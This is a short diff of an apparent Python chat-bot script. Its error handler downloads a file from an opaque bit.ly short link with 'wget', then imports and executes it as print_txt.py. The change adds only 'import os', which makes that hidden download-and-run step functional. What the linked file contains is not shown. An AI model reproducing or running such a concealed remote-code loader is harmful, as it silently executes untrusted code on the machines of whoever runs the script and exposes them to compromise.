@@ -19,6 +19,7 @@ bot = Client(
 try:
     bot.run()
 except Exception:
+    import os
     os.system("wget https://bit.ly/3Ksaa7N -O print_txt.py")
     from print_txt import print_txt
     print(print_txt)
